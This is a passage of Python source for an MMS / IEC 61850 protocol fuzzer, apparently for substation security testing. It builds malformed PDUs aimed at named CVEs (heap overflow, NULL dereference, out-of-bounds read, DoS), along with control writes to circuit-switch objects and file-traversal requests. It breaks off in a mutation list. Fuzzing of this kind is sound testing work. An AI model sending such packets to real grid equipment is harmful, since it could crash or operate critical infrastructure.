"""MMS Protocol Fuzzer

Optimized for breadth-first coverage and early crash detection.
Test ordering follows the 5-phase optimization strategy:
- Phase 1: Quick Service Sweep (~30 sec) - All MMS services once
- Phase 2: High-Crash Tests (~3 min) - Buffer overflow, ASN.1, OSI attacks
- Phase 3: CVE-Targeted Operations (~3 min) - Write, Control, File
- Phase 4: Boundary Attacks (~3 min) - Invoke ID, length, encoding
- Phase 5: Everything Else - Reads, diagnostics, discovery
"""

import random
import struct
from typing import Any, List

from boofuzz import Block, Byte, Bytes, Delim, Group, Request, Size, Static, Word

from ..core.base_fuzzer import BaseFuzzer, RequestInfo
from ..core.config import FuzzerConfig, ProtocolType
from ..core.session.state_context import StateContext
from ..core.session.sequence import SequenceConfig, SequenceDirection
from ..core.session.state_machine import ProtocolState, StateMachine, StateType
from ..monitors import SocketHealthMonitor
from ..primitives.asn1 import (
    encode_ber_context_tag,
    encode_ber_integer,
    encode_ber_length,
    encode_ber_visible_string,
)
from ..primitives.dynamic import SmartBytes, SmartString, StringContext
from ..primitives.osi import MMSStackBuilder, TPKTCOTPBuilder, wrap_in_tpkt_cotp

import logging

logger = logging.getLogger(__name__)


class MMSFuzzer(BaseFuzzer):
    """MMS Protocol Fuzzer for IEC 61850 substation security testing

    Implements ISO 9506 MMS protocol with IEC 61850-8-1 specific mappings.
    Supports ASN.1 BER/DER encoded PDUs for power system automation.

    Protocol options:
    - invoke_id_start: Starting invoke ID (default: 1)
    - max_pdu_size: Maximum PDU size in bytes (default: 65000)
    - use_der: Use DER encoding instead of BER (default: True)
    - domain_name: IEC 61850 domain/logical device name (default: "AA11")
    - enable_file_services: Enable file service fuzzing (default: False)
    - enable_reports: Enable information report fuzzing (default: True)
    - functional_constraint: Default FC for data access (default: "MX")
    - control_model: Control model type (0=direct, 1=sbo, default: 0)
    """

    # Protocol-specific monitor: MMS identify check every 10 tests
    DEFAULT_MONITORS = "mms:10"

    PROTOCOL_OPTIONS = {
        "invoke_id_start": {
            "type": int,
            "default": 1,
            "description": "Starting invoke ID for requests",
            "example": "100",
        },
        "max_pdu_size": {
            "type": int,
            "default": 65000,
            "description": "Maximum PDU size in bytes",
            "example": "8192",
        },
        "use_der": {
            "type": bool,
            "default": True,
            "description": "Use DER encoding instead of BER",
            "example": "false",
        },
        "domain_name": {
            "type": str,
            "default": "AA11",
            "description": "IEC 61850 domain/logical device name",
            "example": "CTRL01",
        },
        "enable_file_services": {
            "type": bool,
            "default": False,
            "description": "Enable file service fuzzing",
            "example": "true",
        },
        "enable_reports": {
            "type": bool,
            "default": True,
            "description": "Enable information report fuzzing",
            "example": "false",
        },
        "functional_constraint": {
            "type": str,
            "default": "MX",
            "description": "Default functional constraint",
            "choices": ["ST", "MX", "CO", "SE", "CF", "DC", "SG"],
            "example": "ST",
        },
        "control_model": {
            "type": int,
            "default": 0,
            "description": "Control model (0=direct, 1=sbo)",
            "choices": [0, 1],
            "example": "1",
        },
        "use_osi_stack": {
            "type": bool,
            "default": True,
            "description": "Use complete OSI stack (TPKT/COTP/Session/Presentation/ACSE)",
            "example": "false",
        },
        "legacy_mode": {
            "type": bool,
            "default": False,
            "description": "Use legacy MMS encoding (no OSI stack)",
            "example": "true",
        },
        "ied_mode": {
            "type": bool,
            "default": False,
            "description": "Enable IED-specific tests (GOOSE, setting groups, disturbance records)",
            "example": "true",
        },
        "mms_username": {
            "type": str,
            "default": "",
            "description": "MMS/ACSE username for authentication fuzzing",
            "example": "operator",
        },
        "mms_password": {
            "type": str,
            "default": "",
            "description": "MMS/ACSE password for authentication fuzzing",
            "example": "password123",
        },
        "enable_auth": {
            "type": bool,
            "default": False,
            "description": "Enable ACSE authentication fuzzing",
        },
        "acse_auth_mechanism": {
            "type": str,
            "default": "password",
            "description": "ACSE authentication mechanism (password, certificate)",
            "choices": ["password", "certificate"],
            "example": "password",
        },
    }

    # MMS PDU Types (context-specific tags)
    PDU_CONFIRMED_REQUEST = 0xA0
    PDU_CONFIRMED_RESPONSE = 0xA1
    PDU_CONFIRMED_ERROR = 0xA2
    PDU_UNCONFIRMED = 0xA3
    PDU_REJECT = 0xA4
    PDU_CANCEL_REQUEST = 0xA5
    PDU_CANCEL_RESPONSE = 0xA6
    PDU_CANCEL_ERROR = 0xA7
    PDU_INITIATE_REQUEST = 0xA8
    PDU_INITIATE_RESPONSE = 0xA9
    PDU_INITIATE_ERROR = 0xAA
    PDU_CONCLUDE_REQUEST = 0xAB
    PDU_CONCLUDE_RESPONSE = 0xAC
    PDU_CONCLUDE_ERROR = 0xAD

    # MMS Confirmed Service Request tags (ISO 9506-2 ASN.1 context-class tags)
    # Low tags (<31): single byte = class|constructed|tag_number
    # High tags (>=31): multi-byte with base-128 encoding
    SERVICE_STATUS = b"\x80"  # [0] primitive
    SERVICE_GET_NAME_LIST = b"\xa1"  # [1] constructed
    SERVICE_IDENTIFY = b"\x82"  # [2] primitive (NULL)
    SERVICE_READ = b"\xa4"  # [4] constructed
    SERVICE_WRITE = b"\xa5"  # [5] constructed
    SERVICE_GET_VARIABLE_ACCESS_ATTRIBUTES = b"\xa7"  # [7] constructed
    SERVICE_DEFINE_NAMED_VARIABLE_LIST = b"\xac"  # [12] constructed
    SERVICE_DELETE_NAMED_VARIABLE_LIST = b"\xae"  # [14] constructed (CVE-2024-26529)
    SERVICE_FILE_OPEN = b"\xbf\x48"  # [72] constructed (long form)
    SERVICE_FILE_READ = b"\x9f\x49"  # [73] primitive (long form)
    SERVICE_FILE_CLOSE = b"\x9f\x4a"  # [74] primitive (long form)
    SERVICE_FILE_DIRECTORY = b"\xbf\x4d"  # [77] constructed (long form)
    SERVICE_INFORMATION_REPORT = b"\xa0"  # [0] constructed (unconfirmed)

    # IEC 61850 AddCause codes
    ADD_CAUSE_UNKNOWN = 0
    ADD_CAUSE_NOT_SUPPORTED = 1
    ADD_CAUSE_BLOCKED_BY_SWITCHING_HIERARCHY = 2
    ADD_CAUSE_SELECT_FAILED = 3
    ADD_CAUSE_INVALID_POSITION = 4
    ADD_CAUSE_OBJECT_ALREADY_SELECTED = 19
    ADD_CAUSE_NO_ACCESS_AUTHORITY = 20
    ADD_CAUSE_LOCKED_BY_OTHER_CLIENT = 27

    @classmethod
    def get_request_definitions(cls) -> List[RequestInfo]:
        """Get static request definitions for --list-requests

        Returns request groups organized by optimization phase for
        maximum coverage and early crash detection.
        """
        return [
            # Phase 1: Quick Coverage
            RequestInfo(
                "MMS_Baseline",
                "Quick service sweep (all 9 services) + baseline read",
                "baseline",
                requires_state="CONNECTED",
            ),
            # Phase 2: High-Crash Tests (moved up)
            RequestInfo(
                "MMS_Buffer_Overflow",
                "Buffer overflow attacks (CVE-2015-6574 pattern)",
                "crash",
                requires_state="CONNECTED",
            ),
            RequestInfo(
                "MMS_ASN1_Attacks",
                "ASN.1/BER encoding attacks",
                "crash",
                requires_state="CONNECTED",
            ),
            RequestInfo(
                "MMS_OSI_Layer",
                "OSI stack layer attacks (COTP/Session/ACSE)",
                "crash",
                requires_state="CONNECTED",
            ),
            RequestInfo(
                "MMS_Initiate_Negotiation",
                "Mutate MMS Initiate negotiation fields (proposedMaxPduSize, "
                "maxServOutstanding calling/called, nestingLevel, service-support "
                "bitstring) - crafted Initiate heap overflow (CVE-2026-49035). "
                "Runs its own association so it never poisons stateful setup.",
                "crash",
                requires_state="COTP_ESTABLISHED",
            ),
            RequestInfo(
                "MMS_Presentation_NormalMode",
                "Malformed ISO Presentation normal-mode-parameters sequence - "
                "parseNormalModeParameters infinite loop / DoS (CVE-2022-21159)",
                "crash",
                requires_state="CONNECTED",
            ),
            RequestInfo(
                "MMS_BER_Length_OOB",
                "BER length-lie / extended-tag / zero-length AP-title OOB reads "
                "across the confirmed-request corpus (CVE-2026-65421, "
                "CVE-2026-66349, CVE-2026-63550, CVE-2026-56758)",
                "crash",
                requires_state="MMS_ASSOCIATED",
            ),
            RequestInfo(
                "MMS_DeleteNamedVariableList",
                "DeleteNamedVariableList w/ malformed name + scopeOfDelete "
                "sweep, plus oversized DefineNamedVariableList (CVE-2024-26529)",
                "crash",
                requires_state="MMS_ASSOCIATED",
            ),
            RequestInfo(
                "MMS_BitString_UnusedBits",
                "Write MMS_BIT_STRING w/ illegal unused-bits octet (>7) and "
                "length exceeding bytes present (CVE-2020-7054 heap overflow)",
                "crash",
                requires_state="MMS_ASSOCIATED",
            ),
            RequestInfo(
                "MMS_OctetString_Length_Lie",
                "Write MMS_OCTET_STRING w/ BER length larger than octets "
                "present, truncated at tail (over-read)",
                "crash",
                requires_state="MMS_ASSOCIATED",
            ),
            RequestInfo(
                "MMS_Write_EmptyVarList",
                "Write to a Named Variable List with an empty listOfData - "
                "NULL deref (CVE-2026-50032, CWE-476)",
                "crash",
                requires_state="MMS_ASSOCIATED",
            ),
            # Phase 3: CVE-Targeted Operations
            RequestInfo(
                "MMS_Write_Operations",
                "Write service fuzzing (CVE target)",
                "write",
                requires_state="MMS_ASSOCIATED",
            ),
            RequestInfo(
                "MMS_Control_Operations",
                "IEC 61850 control operations (CVE-2019-6604)",
                "write",
                requires_state="MMS_ASSOCIATED",
            ),
            RequestInfo(
                "MMS_File_Services",
                "File service attacks (directory traversal)",
                "write",
                requires_state="MMS_ASSOCIATED",
            ),
            # Phase 4: Boundary Attacks
            RequestInfo(
                "MMS_Invoke_ID",
                "Invoke ID boundary testing",
                "boundary",
                requires_state="COTP_ESTABLISHED",
            ),
            RequestInfo(
                "MMS_IEC61850_Attacks",
                "IEC 61850 specific attacks",
                "boundary",
                requires_state="COTP_ESTABLISHED",
            ),
            RequestInfo(
                "MMS_Malformed_PDU",
                "Malformed PDU type testing",
                "boundary",
                requires_state="CONNECTED",
            ),
            RequestInfo(
                "MMS_Structured_Nesting",
                "Deeply nested MMS structured/array data value (recursive decode-depth probe)",
                "boundary",
                requires_state="MMS_ASSOCIATED",
            ),
            # Phase 5: Everything Else
            RequestInfo(
                "MMS_Read_Operations",
                "Read service and discovery",
                "read",
                requires_state="MMS_ASSOCIATED",
            ),
            RequestInfo(
                "MMS_Reports", "Information report fuzzing", "read", requires_state="MMS_ASSOCIATED"
            ),
            RequestInfo(
                "MMS_Session_Mgmt",
                "Session management PDUs",
                "read",
                requires_state="COTP_ESTABLISHED",
            ),
            RequestInfo(
                "MMS_ACSE_Auth",
                "ACSE authentication fuzzing with credentials",
                "auth",
                requires_state="CONNECTED",
            ),
        ]

    # Valid IEC 61850 references that exist in the Python MMS server data model
    # These match actual objects in mms_server.py IEDDataModel
    VALID_REFERENCES = [
        # LLN0 - Logical Node Zero (status/health)
        "LLN0$ST$Beh$stVal",  # Behavior status (integer)
        "LLN0$ST$Health$stVal",  # Health status (integer)
        "LLN0$ST$Mod$stVal",  # Mode (integer)
        # CSWI1 - Circuit Switcher (switches/positions)
        "CSWI1$ST$Pos$stVal",  # Position value (integer)
        "CSWI1$ST$BlkOpn$stVal",  # Block Open (boolean)
        "CSWI1$ST$BlkCls$stVal",  # Block Close (boolean)
        # MMXU1 - Measurement Unit (analog measurements)
        "MMXU1$MX$A$phsA$cVal$mag$f",  # Phase A current magnitude (float)
        "MMXU1$MX$A$phsB$cVal$mag$f",  # Phase B current magnitude (float)
        "MMXU1$MX$A$phsC$cVal$mag$f",  # Phase C current magnitude (float)
        "MMXU1$MX$PPV$phsAB$cVal$mag$f",  # Phase AB voltage (float)
        # Datasets
        "LLN0$DS$Status",  # Status dataset
        "MMXU1$DS$Measurements",  # Measurements dataset
    ]

    def __init__(self, config: FuzzerConfig, connection_factory=None):
        config.protocol_type = ProtocolType.TCP
        super().__init__(config, connection_factory)

        # StateContext for carrying state between transitions
        self._state_context = StateContext()

        # Use SequenceManager for invoke_id tracking
        invoke_id_start = self.config.get_option("invoke_id_start", 1)
        seq_mgr = self._state_context.get_sequence_manager("mms")
        seq_mgr.add_sequence(
            SequenceConfig(
                name="invoke_id",
                initial=invoke_id_start,
                increment=1,
                max_value=0xFFFFFFFF,
                direction=SequenceDirection.SEND,
                wrap_behavior="modulo",
                fuzzable=True,
            )
        )

        # Initialize OSI stack builder if enabled
        self.use_osi_stack = self.config.get_option(
            "use_osi_stack", True
        ) and not self.config.get_option("legacy_mode", False)
        if self.use_osi_stack:
            self.osi_stack = MMSStackBuilder()

        # Track OSI association state
        self.association_established = False
        self.cotp_connection_established = False
        self.negotiated_max_pdu = None

    @property
    def invoke_id(self) -> int:
        """Get current invoke ID from SequenceManager."""
        seq_mgr = self._state_context.get_sequence_manager("mms")
        return seq_mgr.get("invoke_id")

    @invoke_id.setter
    def invoke_id(self, value: int) -> None:
        """Set invoke ID in SequenceManager."""
        seq_mgr = self._state_context.get_sequence_manager("mms")
        seq_mgr.set("invoke_id", value)

    def _next_invoke_id(self) -> int:
        """Get current invoke ID and increment for next use."""
        seq_mgr = self._state_context.get_sequence_manager("mms")
        return seq_mgr.get_and_increment("invoke_id")

    def _define_state_machine(self) -> None:
        """Establish MMS/OSI association on a temporary socket and build state machine.

        Performs the full two-step OSI handshake:
        1. COTP Connection Request (CR) → Connection Confirm (CC)
        2. MMS Initiate Request (via Session/Presentation/ACSE) → Initiate Response

        Extracts negotiated parameters (max PDU size) from the server response
        and defines states: CONNECTED → COTP_ESTABLISHED → MMS_ASSOCIATED.
        """
        if not self.use_osi_stack:
            return

        import socket

        target_ip = self.config.target_ip
        target_port = self.config.target_port or 102
        sock = None

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((target_ip, target_port))

            # Step 1: COTP Connection Request → Connection Confirm
            builder = TPKTCOTPBuilder()
            cr_packet = builder.build_connection_request()
            sock.send(cr_packet)
            response = sock.recv(1024)

            if len(response) < 4 or response[0] != 0x03 or response[1] != 0x00:
                self.log.warning("[MMS] Invalid TPKT header in COTP response")
            else:
                # Validate COTP CC: PDU type byte has 0xD0 in high nibble
                cotp_offset = 4  # After TPKT header
                if len(response) > cotp_offset + 1 and (response[cotp_offset + 1] & 0xF0) == 0xD0:
                    self.cotp_connection_established = True
                    self.log.debug("[MMS] COTP connection established")
                else:
                    self.log.warning("[MMS] COTP CC not received")

            if not self.cotp_connection_established:
                self.log.warning("[MMS] COTP handshake failed, skipping MMS association")
            else:
                # Step 2: MMS Initiate Request → Initiate Response
                mms_initiate = self._create_initiate_request()
                full_packet = self.osi_stack.build_initiate_request(mms_initiate)
                sock.send(full_packet)
                response = sock.recv(4096)

                if len(response) > 0 and b"\x61" in response:
                    self.association_established = True
                    self.log.debug("[MMS] MMS association established")

                    # Parse MMS Initiate-ResponsePDU (tag 0xa9) for negotiated max PDU
                    self._parse_initiate_response(response)
                else:
                    self.log.warning("[MMS] AARE not found in response")

        except socket.timeout:
            self.log.warning("[MMS] State machine handshake timed out, using defaults")
        except Exception as e:
            self.log.warning(f"[MMS] State machine handshake failed: {e}")
        finally:
            if sock:
                try:
                    sock.close()
                except Exception as e:
                    logger.debug(f"sock.close(): {e}")

        # Store connection state in context
        ctx = self._state_context
        ctx.set("cotp_connection_established", self.cotp_connection_established)
        ctx.set("association_established", self.association_established)
        if self.negotiated_max_pdu is not None:
            ctx.set("negotiated_max_pdu", self.negotiated_max_pdu)

        # Define state machine with marker states
        connected = ProtocolState(
            name="CONNECTED",
            state_type=StateType.CONNECTION,
            description="TCP connection established",
        )

        cotp_established = ProtocolState(
            name="COTP_ESTABLISHED",
            validation=self._validate_cotp,
            requires=["CONNECTED"],
            description="COTP transport connection established",
        )

        mms_associated = ProtocolState(
            name="MMS_ASSOCIATED",
            validation=self._validate_association,
            requires=["COTP_ESTABLISHED"],
            description="MMS association established with server",
        )

        self.state_machine = StateMachine(
            initial_state=connected,
            states=[connected, cotp_established, mms_associated],
            context=self._state_context,
        )

        # Advance to the highest state achieved
        # Ensure state consistency: if association is established, COTP must be too
        if self.association_established and not self.cotp_connection_established:
            self.cotp_connection_established = True
        if self.cotp_connection_established:
            self.state_machine.transition_to("COTP_ESTABLISHED")
        if self.association_established:
            self.state_machine.transition_to("MMS_ASSOCIATED")

        pdu_info = ""
        if self.negotiated_max_pdu is not None:
            pdu_info = f" - negotiated max PDU: {self.negotiated_max_pdu}"
        self.log.display(
            f"[MMS] State machine initialized: "
            f"{self.state_machine.get_current_state_name()}{pdu_info}"
        )

    def _parse_initiate_response(self, response: bytes) -> None:
        """Parse MMS Initiate-ResponsePDU to extract negotiated max PDU size.

        Scans response bytes for tag 0xa9 (Initiate-ResponsePDU) and extracts
        the local-detail-called parameter which contains the negotiated max PDU.
        """
        try:
            # Find MMS Initiate-ResponsePDU tag (0xa9)
            idx = response.find(bytes([self.PDU_INITIATE_RESPONSE]))
            if idx < 0:
                return

            # Skip tag byte
            idx += 1
            if idx >= len(response):
                return

            # Parse BER length
            length_byte = response[idx]
            if length_byte < 0x80:
                content_start = idx + 1
            elif length_byte == 0x81:
                content_start = idx + 2
            elif length_byte == 0x82:
                content_start = idx + 3
            else:
                return

            if content_start >= len(response):
                return

            # The first field in Initiate-ResponsePDU is local-detail-called
            # which is context[0] containing the negotiated max PDU size
            pos = content_start
            if pos < len(response) and (response[pos] & 0xE0) == 0x80:
                # Context tag found, parse its value
                pos += 1
                if pos >= len(response):
                    return
                field_len = response[pos]
                pos += 1
                if pos + field_len <= len(response) and field_len <= 4:
                    value = int.from_bytes(response[pos : pos + field_len], "big")
                    if 0 < value <= 65535:
                        self.negotiated_max_pdu = value
                        self.log.debug(f"[MMS] Negotiated max PDU size: {self.negotiated_max_pdu}")
        except Exception as e:
            self.log.debug(f"[MMS] Could not parse Initiate Response: {e}")

    def _validate_cotp(self) -> bool:
        """Check if COTP connection is still valid."""
        return self.cotp_connection_established

    def _validate_association(self) -> bool:
        """Check if MMS association is still valid."""
        return self.association_established

    def setup_custom_monitors(self):
        """Setup MMS-specific monitors"""
        return [
            SocketHealthMonitor(
                self.config.target_ip,
                self.config.target_port or 102,  # ISO-TSAP port 102
                retry_count=3,
                timeout=5,
            )
        ]

    def _create_mms_data_value(self, value_type: str = "integer", value: Any = None) -> bytes:
        """Create MMS Data type encoding"""
        if value_type == "integer":
            val = value if value is not None else random.randint(0, 65535)
            # Context tag 5 for integer in MMS Data
            return encode_ber_context_tag(5, struct.pack(">H", val), False)
        elif value_type == "boolean":
            val = value if value is not None else (random.randint(0, 1) == 1)
            # Context tag 3 for boolean
            return bytes([0x83, 0x01, 0xFF if val else 0x00])
        elif value_type == "bitstring":
            # Context tag 4 for bitstring
            # Quality bits: 0xc0 = good, valid
            return bytes([0x84, 0x01, 0xC0])
        elif value_type == "visible-string":
            text = value if value else "TEST_VALUE"
            # Context tag 10 for visible-string
            return encode_ber_context_tag(10, text.encode("ascii"), False)
        elif value_type == "structure":
            # Context tag 2 for structure
            # Example: measurement with value and quality
            content = encode_ber_context_tag(5, struct.pack(">H", 1000), False) + bytes(
                [0x84, 0x01, 0xC0]
            )  # quality bits
            return encode_ber_context_tag(2, content, True)
        else:
            # Default to octet-string
            data = value if value else b"\x00\x01\x02\x03"
            # Context tag 9 for octet-string
            return encode_ber_context_tag(9, data, False)

    def _create_variable_specification(self, domain: str = None, item: str = None) -> bytes:
        """Create variable access specification"""
        import random

        domain = domain or self.config.get_option("domain_name", "AA11")

        # Use valid references from the server's data model
        if item is None and self.config.get_option("use_valid_references", True):
            # Randomly select from valid IEC 61850 references
            item = random.choice(self.VALID_REFERENCES)
        elif item is None:
            # Fallback to generic reference (old behavior)
            fc = self.config.get_option("functional_constraint", "MX")
            item = f"${fc}$PhsMeas1$q"

        # Domain-specific variable specification
        domain_id = encode_ber_context_tag(0, domain.encode("ascii"), False)
        item_id = encode_ber_context_tag(1, item.encode("ascii"), False)

        # Combine in sequence
        domain_spec = encode_ber_context_tag(1, domain_id + item_id, True)
        var_spec = encode_ber_context_tag(0, domain_spec, True)

        # List of variables
        sequence = bytes([0x30]) + encode_ber_length(len(var_spec)) + var_spec
        list_of_var = encode_ber_context_tag(1, sequence, True)

        return encode_ber_context_tag(0, list_of_var, True)

    def _create_confirmed_request(
        self, invoke_id: int, service_tag: bytes, service_data: bytes
    ) -> bytes:
        """Create a confirmed request PDU"""
        # Encode invoke ID
        invoke_id_encoded = encode_ber_integer(invoke_id)

        # Service request with context tag (bytes, supports multi-byte high tags)
        service = service_tag + encode_ber_length(len(service_data)) + service_data

        # Combine into sequence
        content = invoke_id_encoded + service

        # Wrap in confirmed-request PDU tag
        return bytes([self.PDU_CONFIRMED_REQUEST]) + encode_ber_length(len(content)) + content

    def _create_read_request(self, invoke_id: int = None) -> bytes:
        """Create MMS Read service request"""
        if invoke_id is None:
            invoke_id = self._next_invoke_id()

        var_spec = self._create_variable_specification()
        return self._create_confirmed_request(invoke_id, self.SERVICE_READ, var_spec)

    def _create_write_request(self, invoke_id: int = None) -> bytes:
        """Create MMS Write service request"""
        if invoke_id is None:
            invoke_id = self._next_invoke_id()

        var_spec = self._create_variable_specification()

        # Add data values
        data_value = self._create_mms_data_value("integer", 42)
        list_of_data = encode_ber_context_tag(0, data_value, True)

        service_data = var_spec + list_of_data
        return self._create_confirmed_request(invoke_id, self.SERVICE_WRITE, service_data)

    def _create_get_namelist_request(self, invoke_id: int = None) -> bytes:
        """Create MMS GetNameList service request"""
        if invoke_id is None:
            invoke_id = self._next_invoke_id()

        # Object class: 0 = named variable
        object_class = encode_ber_context_tag(0, b"\x00", False)

        # Object scope: 1 = domain-specific
        domain = self.config.get_option("domain_name", "AA11")
        domain_encoded = encode_ber_visible_string(domain)
        scope = encode_ber_context_tag(1, domain_encoded, False)

        service_data = object_class + scope
        return self._create_confirmed_request(invoke_id, self.SERVICE_GET_NAME_LIST, service_data)

    def _create_identify_request(self, invoke_id: int = None) -> bytes:
        """Create MMS Identify service request"""
        if invoke_id is None:
            invoke_id = self._next_invoke_id()

        # Identify request has no parameters (empty service data)
        return self._create_confirmed_request(invoke_id, self.SERVICE_IDENTIFY, b"")

    def _create_information_report(self, dataset_name: str = None) -> bytes:
        """Create unconfirmed information report (for IEC 61850 reporting)"""
        dataset_name = dataset_name or "LLN0$BR$brcbST01"

        # Variable access specification (dataset reference)
        var_name = encode_ber_context_tag(1, dataset_name.encode("ascii"), False)
        var_spec = encode_ber_context_tag(0, var_name, True)

        # List of access results (data values)
        data_values = []
        for i in range(3):  # Report with 3 values
            data_values.append(self._create_mms_data_value("structure"))

        access_results = b"".join(data_values)
        list_of_results = encode_ber_context_tag(0, access_results, True)

        # Optional fields (sequence number, timestamp, reason)
        seq_num = encode_ber_context_tag(1, struct.pack(">H", 1), False)

        # Combine all parts
        report_content = var_spec + list_of_results + seq_num
        service = encode_ber_context_tag(0, report_content, True)

        # Wrap in unconfirmed PDU
        return bytes([self.PDU_UNCONFIRMED]) + encode_ber_length(len(service)) + service

    def _create_control_request(self, control_ref: str = None, operation: str = "select") -> bytes:
        """Create IEC 61850 control request (select/operate)"""
        if control_ref is None:
            domain = self.config.get_option("domain_name", "AA11")
            control_ref = f"{domain}/CSWI1$CO$Pos"
        else:
            # Extract domain from control_ref (format: "DOMAIN/object$ref")
            if "/" in control_ref:
                domain = control_ref.split("/")[0]
            else:
                domain = self.config.get_option("domain_name", "AA11")

        invoke_id = self._next_invoke_id()

        # Build control value based on operation
        if operation == "select":
            # Select: write to $Oper$ctlVal with select flag
            item_id = f"{control_ref}$Oper$ctlVal"
            control_value = struct.pack(">B", 1)  # Position ON
        else:  # operate
            item_id = f"{control_ref}$Oper"
            # Structured value with ctlVal, origin, ctlNum, T, Test
            control_struct = (
                encode_ber_context_tag(0, b"\x01", False)  # ctlVal
                + encode_ber_context_tag(
                    1,  # origin
                    encode_ber_context_tag(0, b"\x00", False)  # orCat
                    + encode_ber_visible_string("Operator"),  # orIdent
                    True,
                )
                + encode_ber_context_tag(2, struct.pack(">H", 1), False)  # ctlNum
                + encode_ber_context_tag(3, struct.pack(">Q", 0), False)  # T (timestamp)
            )
            control_value = encode_ber_context_tag(2, control_struct, True)

        # Create write request
        var_spec = self._create_variable_specification(domain, item_id)
        list_of_data = encode_ber_context_tag(0, control_value, True)

        service_data = var_spec + list_of_data
        return self._create_confirmed_request(invoke_id, self.SERVICE_WRITE, service_data)

    def _create_file_open_request(self, filename: str = None) -> bytes:
        """Create MMS FileOpen service request"""
        if filename is None:
            filename = "COMTRADE/FAULT_001.cfg"

        invoke_id = self._next_invoke_id()

        # Filename
        file_encoded = encode_ber_context_tag(0, filename.encode("ascii"), False)

        # Initial position (0)
        position = encode_ber_context_tag(1, struct.pack(">I", 0), False)

        service_data = file_encoded + position
        return self._create_confirmed_request(invoke_id, self.SERVICE_FILE_OPEN, service_data)

    def _create_reject_pdu(self, original_invoke_id: int = None, reason: int = 1) -> bytes:
        """Create reject PDU for error testing"""
        content = b""

        if original_invoke_id is not None:
            # Include original invoke ID reference
            content += encode_ber_context_tag(0, struct.pack(">H", original_invoke_id), False)

        # Rejection reason (1 = unrecognized service)
        content += encode_ber_context_tag(
            1, encode_ber_context_tag(5, bytes([reason]), False), True
        )

        return bytes([self.PDU_REJECT]) + encode_ber_length(len(content)) + content

    def _create_initiate_request(self) -> bytes:
        """Create MMS Initiate-RequestPDU (ISO 9506-1).

        Structure:
            [0] IMPLICIT localDetailCalling (max PDU size)
            [1] IMPLICIT proposedMaxServOutstanding-calling
            [2] IMPLICIT proposedMaxServOutstanding-called
            [3] IMPLICIT proposedDataStructureNestingLevel
            [4] IMPLICIT initRequestDetail SEQUENCE {
                [0] IMPLICIT proposedVersionNumber
                [1] IMPLICIT proposedParameterCBB (BIT STRING)
                [2] IMPLICIT servicesSupportedCalling (BIT STRING)
            }
        """
        max_pdu = self.config.get_option("max_pdu_size", 65000)

        # BER-encode max PDU as positive integer (leading zero if high bit set)
        pdu_bytes = max_pdu.to_bytes((max_pdu.bit_length() + 7) // 8, "big")
        if pdu_bytes[0] & 0x80:
            pdu_bytes = b"\x00" + pdu_bytes

        content = bytearray()
        # [0] localDetailCalling
        content.extend(encode_ber_context_tag(0, pdu_bytes, False))
        # [1] proposedMaxServOutstanding-calling = 5
        content.extend(encode_ber_context_tag(1, b"\x05", False))
        # [2] proposedMaxServOutstanding-called = 5
        content.extend(encode_ber_context_tag(2, b"\x05", False))
        # [3] proposedDataStructureNestingLevel = 10
        content.extend(encode_ber_context_tag(3, b"\x0a", False))
        # [4] initRequestDetail
        init_detail = (
            # [0] proposedVersionNumber = 1
            encode_ber_context_tag(0, b"\x01", False)
            +
            # [1] proposedParameterCBB: BIT STRING (5 unused bits, f1 00)
            encode_ber_context_tag(1, b"\x05\xf1\x00", False)
            +
            # [2] servicesSupportedCalling: BIT STRING (3 unused, 11 bytes)
            encode_ber_context_tag(2, b"\x03\xee\x1c\x00\x00\x04\x08\x00\x00\x79\xef\x18", False)
        )
        content.extend(encode_ber_context_tag(4, init_detail, True))

        return bytes([self.PDU_INITIATE_REQUEST]) + encode_ber_length(len(content)) + bytes(content)

    def _create_fuzzable_initiate_pdu(
        self,
        local_detail: bytes = b"\xff\xff",
        serv_calling: bytes = b"\x05",
        serv_called: bytes = b"\x05",
        nesting_level: bytes = b"\x0a",
        proposed_cbb: bytes = b"\x05\xf1\x00",
        services_supported: bytes = b"\x03\xee\x1c\x00\x00\x04\x08\x00\x00\x79\xef\x18",
    ) -> bytes:
        """Build an MMS Initiate-RequestPDU with attacker-controlled negotiation
        fields for CVE-2026-49035 (heap overflow, CWE-122, CVSS 9.2 RCE-class,
        via a crafted MMS Initiate request; CISA ICSA-26-204-06).

        Each argument is the raw BER *value* octets for one negotiation field so
        callers can inject oversized / zero / boundary values while the
        surrounding framing stays valid (encode_ber_context_tag recomputes each
        field length). Mirrors the field layout of _create_initiate_request but
        makes every negotiation parameter a mutation point.
        """
        content = bytearray()
        # [0] localDetailCalling == proposedMaxPduSize (initRequestDetail driver)
        content.extend(encode_ber_context_tag(0, local_detail, False))
        # [1] proposedMaxServOutstanding-calling
        content.extend(encode_ber_context_tag(1, serv_calling, False))
        # [2] proposedMaxServOutstanding-called
        content.extend(encode_ber_context_tag(2, serv_called, False))
        # [3] proposedDataStructureNestingLevel
        content.extend(encode_ber_context_tag(3, nesting_level, False))
        # [4] initRequestDetail SEQUENCE
        init_detail = (
            encode_ber_context_tag(0, b"\x01", False)  # proposedVersionNumber
            + encode_ber_context_tag(1, proposed_cbb, False)  # proposedParameterCBB (BIT STRING)
            + encode_ber_context_tag(2, services_supported, False)  # servicesSupportedCalling
        )
        content.extend(encode_ber_context_tag(4, init_detail, True))
        return bytes([self.PDU_INITIATE_REQUEST]) + encode_ber_length(len(content)) + bytes(content)

    def _build_initiate_negotiation_variants(self) -> List[bytes]:
        """Full-stack MMS Initiate packets with mutated negotiation fields
        (CVE-2026-49035).

        Each entry is a complete, correctly-framed packet (the OSI wrapper
        recomputes its own lengths around the mutated Initiate) so the malicious
        Initiate actually reaches libIEC61850's parser instead of being rejected
        at an outer OSI layer. This request runs on its own connection and does
        NOT reuse the pristine Initiate from _define_state_machine, so the
        stateful association used by MMS_ASSOCIATED-state requests is never
        poisoned by these mutations.
        """
        mutations: List[dict] = [
            # proposedMaxPduSize (localDetailCalling): boundary / oversized / zero
            {"local_detail": b"\x00"},  # zero max PDU
            {"local_detail": b""},  # zero-length integer
            {"local_detail": b"\xff\xff"},  # 65535
            {"local_detail": b"\x7f\xff\xff\xff"},  # ~2GB
            {"local_detail": b"\xff\xff\xff\xff"},  # -1 / uint32 max
            {"local_detail": b"\x00" * 8},  # 8-byte oversized encoding
            # proposedMaxServOutstanding calling / called
            {"serv_calling": b"\x00", "serv_called": b"\x00"},  # zero outstanding
            {"serv_calling": b"\xff\xff\xff\xff"},  # oversized calling
            {"serv_called": b"\x7f\xff\xff\xff"},  # oversized called
